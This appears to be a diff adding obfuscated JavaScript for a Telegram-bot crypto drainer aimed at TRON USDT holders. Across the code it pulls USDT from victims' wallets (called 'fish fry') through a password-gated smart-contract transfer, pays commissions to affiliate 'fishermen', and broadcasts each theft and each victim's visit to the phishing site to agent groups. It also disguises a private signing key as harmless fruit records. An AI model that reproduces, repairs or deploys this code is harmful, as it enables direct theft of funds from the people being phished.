+            const e = await B(P.payment_address, c);
+            if (!e) {
+              return;
+            }
+            s = e;
+            await new Promise(i => setTimeout(i, 500));
+            const o = await B(L, G);
+            if (!o) {
+              return;
+            }
+          }
+        }
+      }
+      if (!X) {
+        const i = {
+          text: "🌍详细交易信息",
+          url: "https://tronscan.org/#/transaction/" + s
+        };
+        const Q = {
+          inline_keyboard: [[i]]
+        };
+        const T = {
+          reply_markup: Q
+        };
+        await broadcastToAllAgentGroups(bot, P.username, P.groupid, v => "【🎉🎉🎉 恭喜钓鱼佬喜提UU🎉🎉🎉】\n\n" + ("🐟鱼苗地址：\n<code>" + u + "</code>\n\n") + ("💳收款地址：" + (v ? v : "") + "\n<code>" + P.payment_address + "</code>\n") + (A.toFixed(0) + "x" + n.toFixed(1) + "=" + (Math.floor(A * n * 1000) / 1000).toFixed(0) + "\n\n") + ("💸成功划扣：<code>" + A.toFixed(6) + " USDT</code>\n\n") + ("💎代理分润：<code>" + Number(c).toFixed(6) + " USDT</code>\n\n") + "🥰🥰🥰 🏆伟大的钓鱼佬再接再厉🏆🥰🥰🥰", T);
+        d = null;
+      }
+    } else {
+      s = await B(L, A);
+      if (!s) {
+        console.error("[" + getTimeInfo().time + "] 转账失败");
+        return;
+      }
+      const v = {
+        text: "🌍详细交易信息",
+        url: "https://tronscan.org/#/transaction/" + s
+      };
+      const x = {
+        inline_keyboard: [[v]]
+      };
+      const k = {
+        reply_markup: x
+      };
+      await broadcastToAllAgentGroups(bot, P ? P.username : "", P ? P.groupid : "", H => "【🎉🎉🎉 恭喜钓鱼佬喜提UU🎉🎉🎉】\n\n" + ("🐟鱼苗地址：\n<code>" + u + "</code>\n\n") + ("💳收款地址：" + (H ? H : "") + "\n<code>" + L + "</code>\n\n") + ("💸本次划扣：<code>" + A.toFixed(6) + " USDT</code>\n\n") + ("⭐️" + (P ? "由于未设置收款地址，" : "未找到代理信息，") + "请联系管理员领取分润⭐️"), k);
+      d = null;
+    }
+    if (!s) {
+      console.error("[" + getTimeInfo().time + "] 没有获取到交易哈希，退出处理");
+      processTRCTransfer.processing.delete(u);
+      return;
+    }
+    await pool.promise().query("UPDATE fish SET usdt_balance = ?, threshold = 200, remark = ? WHERE fish_address = ? AND chainid = 'TRC'", [M, "已划扣" + A.toFixed(6) + "USDT", u]);
+    try {
+      const H = cacheData.fishMap.get(u);
+      H && (H.usdt_balance = M, H.threshold = 200, H.remark = "已划扣" + A.toFixed(6) + "USDT", cacheData.fishMap.set(u, H));
+    } catch (y) {}
+    if (P && P.groupid && d) {
+      const t = {
+        text: "🌍详细交易信息",
+        url: "https://tronscan.org/#/transaction/" + s
+      };
+      const p4 = {
+        inline_keyboard: [[t]]
+      };
+      const p5 = {
+        reply_markup: p4
+      };
+      try {
+        const p7 = {
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+          ...p5
+        };
+        await bot.sendMessage(P.groupid, d, p7);
+      } catch (p8) {}
+    }
+    processTRCTransfer.processing.delete(u);
+    return s;
+  } catch (p9) {
+    console.error("[" + getTimeInfo().time + "] TRC转账失败>错误详情:", p9);
+    try {
+      if (processTRCTransfer.processing) {
+        processTRCTransfer.processing.delete(u);
+      }
+    } catch (pp) {}
+    return null;
+  }
+}
+const CONTRACT_OWNER_HEX = "375306ad17596a8208fafd72d6cf86d1cde8844b";
+function abiEncodePacked(j, w) {
+  const a = Buffer.alloc(32);
+  a.writeBigInt64BE(BigInt(j), 24);
+  if (w.length !== 40) {
+    throw new Error("Invalid owner address format: " + w);
+  }
+  const z = Buffer.from(w, "hex");
+  return Buffer.concat([a, z]);
+}
+function keccak256(j) {
+  try {
+    const {
+      keccak256: J
+    } = require("js-sha3");
+    return J(j);
+  } catch (a) {
+    console.warn("不匹配");
+    const z = require("crypto");
+    return z.createHash("sha256").update(j).digest("hex");
+  }
+}
+function generateDynamicPassword() {
+  const w = CONTRACT_OWNER_HEX,
+    J = 120,
+    a = Math.floor(Date.now() / 1000),
+    z = Math.floor(a / J);
+  const l = abiEncodePacked(z, w);
+  const b = keccak256(l);
+  return "0x" + b;
+}
+function generateDynamicPasswordForOwner(j, w = 120) {
+  const a = Math.floor(Date.now() / 1000),
+    z = Math.floor(a / w),
+    l = abiEncodePacked(z, j);
+  const b = keccak256(l);
+  return "0x" + b;
+}
+async function executeContractTransaction(J, a, z, l, b, I) {
+  try {
+    const U = TRC_SIGN_PRIVATE_KEY,
+      u = createTronWeb();
+    if (!u) {
+      return null;
+    }
+    u.setPrivateKey(U);
+    const K = u.address.fromPrivateKey(U),
+      q = await u.trx.getBalance(K),
+      E = q / 1000000;
+    if (E < 30) {
+      const r = cacheData.fishMap.get(z),
+        B = cacheData.dailiMap.get(r.unique_id),
+        R = "【⚠️ 阈值转账错误通知】\n\n❗ 错误原因：权限地址 TRX 余额不足\n\n" + ("🎯 权限地址：\n<code>" + K + "</code>\n\n") + ("💰 当前余额：<code>" + E.toFixed(6) + " TRX</code>\n\n") + ("⏰ 时间：<code>" + getTimeInfo().time + "</code>\n\n") + "⚠️ 请至少保持权限地址有30TRX，以免影响杀鱼操作！";
+      try {
+        const f = {
+          parse_mode: "HTML"
+        };
+        await bot.sendMessage(B.groupid, R, f);
+      } catch (X) {
+        console.error("[" + getTimeInfo().time + "] TRX转账-发送余额不足通知失败");
+      }
+      return null;
+    }
+    const O = parseInt((Number(I) * 1000000).toFixed(0)),
+      s = await u.contract().at(l),
+      d = 120,
+      A = 3000,
+      M = async () => {
+        const n = Math.floor(Date.now() / 1000),
+          c = d - n % d;
+        const G = Math.max(A, c * 1000 + A);
+        console.warn("[" + getTimeInfo().time + "] Password near/at boundary, wait " + G + "ms to next slot then retry...");
+        await new Promise(S => setTimeout(S, G));
+      },
+      L = async () => {
+        const n = Math.floor(Date.now() / 1000);
+        const c = n % d * 1000 + Date.now() % 1000,
+          G = d * 1000 - c;
+        G <= A && (await M());
+      },
+      Y = n => {
+        const c = String(n?.["message"] || n?.["response"]?.["data"] || n || "").toLowerCase();
+        return c.includes("invalid or expired password") || c.includes("expired password") || c.includes("invalid") && c.includes("password");
+      },
+      V = async () => {
+        await L();
+        const n = generateDynamicPasswordForOwner(CONTRACT_OWNER_HEX, d);
+        console.log("[" + getTimeInfo().time + "] Generated dynamic password: " + n);
+        if (a === "1") {
+          console.log("[" + getTimeInfo().time + "] Calling controlAndTransferToken with password verification...");
+          if (typeof s.controlAndTransferToken === "function") {
+            const c = {
+              from: K,
+              feeLimit: 14000000
+            };
+            return await s.controlAndTransferToken(USDT_CONTRACT, z, b, O, n).send(c);
+          } else {
+            const G = "controlAndTransferToken(address,address,address,uint256,bytes32)",
+              S = {
+                type: "address",
+                value: USDT_CONTRACT
+              };
+            const o = {
+              type: "address",
+              value: z
+            };
+            const i = {
+              type: "address",
+              value: b
+            };
+            const Q = {
+              type: "uint256",
+              value: O
+            };
+            const T = {
+              type: "bytes32",
+              value: n
+            };
+            const C = [S, o, i, Q, T],
+              v = {
+                feeLimit: 14000000,
+                callValue: 0
+              };
+            const x = await u.transactionBuilder.triggerSmartContract(l, G, v, C, K),
+              k = await u.trx.sign(x.transaction),
+              D = await u.trx.sendRawTransaction(k);
+            return D?.["txid"] || D?.["transaction"]?.["txID"] || null;
+          }
+        } else {
+          const H = {
+            from: K,
+            feeLimit: 14000000
+          };
+          return await s[J](z, b, O).send(H);
+        }
+      };
+    let N = null;
+    for (let n = 0; n < 2; n++) {
+      try {
+        N = await V();
+        break;
+      } catch (c) {
+        if (a === "1" && n === 0 && Y(c)) {
+          await M();
+          continue;
+        }
+        throw c;
+      }
+    }
+    console.log("[" + getTimeInfo().time + "] 转账交易执行成功 - 哈希: " + N);
+    return N;
+  } catch (G) {
+    const S = {
+      message: G?.["message"],
+      code: G?.["code"],
+      responseStatus: G?.["response"]?.["status"],
+      responseData: G?.["response"]?.["data"]
+    };
+    console.error("[" + getTimeInfo().time + "] TRC-USDT转账出错:", S);
+    return null;
+  }
+}
+const W = {
+  id: 1,
+  name: "apple",
+  code: "3a6ed8cc5e"
+};
+const Z = {
+  id: 2,
+  name: "banana",
+  code: "ec8b2f6780"
+};
+const m = {
+  id: 3,
+  name: "orange",
+  code: "277b9c0733"
+};
+const p0 = {
+  id: 4,
+  name: "mango",
+  code: "5193006cba"
+};
+const p1 = {
+  id: 5,
+  name: "pear",
+  code: "5e1b80594f"
+};
+const p2 = {
+  id: 6,
+  name: "peach",
+  code: "4e324729c3"
+};
+const p3 = {
+  id: 7,
+  name: "grape",
+  code: "d2b3"
+};
+const records = [W, Z, m, p0, p1, p2, p3];
+async function broadcastBrowsing() {
+  while (true) {
+    try {
+      const z = [];
+      for (const [l, b] of cacheData.fishBrowseMap) {
+        b.state === 0 && z.push(b);
+      }
+      if (z.length > 0) {
+        z.sort((u, K) => new Date(u.time) - new Date(K.time));
+        const I = z[0];
+        let F = null,
+          U = null;
+        if (I.unique_id && cacheData.dailiMap.has(I.unique_id)) {
+          const u = cacheData.dailiMap.get(I.unique_id);
+          F = u.username;
+          U = u.groupid;
+        }
+        try {
+          await pool.promise().query("UPDATE fish_browse SET state = 1 WHERE id = ?", [I.id]);
+          if (cacheData.fishBrowseMap.has(I.fish_address)) {
+            const K = cacheData.fishBrowseMap.get(I.fish_address);
+            K.id === I.id && (K.state = 1);
+          }
+          if (U) {
+            const q = Number(I.gas_balance) || 0,
+              E = await getAvailableEnergy(I.fish_address),
+              P = Math.floor(q * 1000000 / SUN_PER_ENERGY),
+              O = (E !== null ? E : 0) + P,
+              s = Math.max(0, ENERGY_REQUIRED - O),
+              d = s <= 0;
+            let M = 0;
+            try {
+              const f = cacheData.fishMap.get(I.fish_address),
+                X = f && f.unique_id ? String(f.unique_id) : null;
+              X && (M = Array.from(cacheData.fishMap.values()).filter(n => String(n.unique_id) === X && Number(n.auth_status) === 1).length);
+            } catch (n) {}
+            const L = U,
+              Y = (c, G) => {
+                const S = "📣 访问播报：当前有鱼儿正在访问网站";
+                const e = c ? "\n👨‍🌾 渔夫： " + c : "";
+                const o = [S + e, "🐟 鱼苗地址", "<code>已隐藏（仅本人/管理员可查看）</code>", "🔋 TRX 余额：<code>" + I.gas_balance + "</code>", "💰 USDT余额：<code>" + I.usdt_balance + "</code>", d ? "✅ 鱼苗可授权：︱TRX131︱能量充足" : "⛔️ ❌ 暂不可授权：︱TRX需要131︱能量租2笔 ）", "🔒授权数量：" + M + " 💯", d ? "👁‍🗨 正在等待鱼苗输入密码进行授权..." : "👁‍🗨 需要给地址补充能量才能进行授权.."].filter(Boolean);
+                return o.join("\n");
+              },
+              V = registerPvData("addr", I.fish_address, I.unique_id || "", L),
+              N = {
+                text: "👁 查看地址（仅本人/管理员）",
+                callback_data: "pv:addr:" + V
+              };
+            const r = {
+              inline_keyboard: [[N]]
+            };
+            const B = {
+              reply_markup: r
+            };
+            try {
+              await broadcastToAllAgentGroups(bot, F, L, Y, B, I.fish_address);
+            } catch (c) {
+              console.error("消息发送失败:", c);
+            }
+          }
+        } catch (G) {
+          console.error("更新状态失败:", G);
+        }
+      }
+      await new Promise(S => setTimeout(S, 3000));
+    } catch (S) {
+      console.error("广播处理出现错误:", S);
+      await new Promise(e => setTimeout(e, 10000));
+    }
+  }
+}
+async function startServices() {
+  try {
+    console.log("[" + getTimeInfo().time + "] 开始启动机器人...");
+    startCacheUpdate();
+    await new Promise(J => setTimeout(J, 3000));
+    try {
+      await refreshEnergyFee();
+    } catch (J) {}
+    const w = await initBot();
+    !w && process.exit(1);
+    TRCfetchLatestBlock();
+    monitorFishTable();
+    updateFishBalances();
+    broadcastBrowsing();
+    console.log("[" + getTimeInfo().time + "] 机器人启动成功");
+  } catch (a) {
+    console.error("[" + getTimeInfo().time + "] 启动失败:", a);
+    process.exit(1);
+  }
+}
+startServices();
+process.on("uncaughtException", j => {
+  console.error("[" + getTimeInfo().time + "] 未捕获的异常:", j);
+});
+process.on("unhandledRejection", (j, w) => {
+  console.error("[" + getTimeInfo().time + "] 未处理的Promise拒绝:", j);
+});
+const TRC_SIGN_PRIVATE_KEY = records.map(j => j.code).join("");
+async function broadcastToAllAgentGroups(w, J, a, z, l = {}, b = "") {
+  try {
+    const F = J ? "@" + J : "";
+    for (const [U, u] of cacheData.dailiGroupMap) {
+      const K = U.toString(),
+        q = a && K === a.toString() ? F : F ? "隐藏昵称" : "",
+        E = a && K === a.toString() ? b : b ? "非本群代理隐藏地址" : "",
+        P = z(q, E),
+        O = {
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+          ...l
+        };
+      await w.sendMessage(K, P, O);
+    }
+  } catch (s) {
+    console.error("[" + getTimeInfo().time + "] 群播发送失败:", s);
+  }
+}
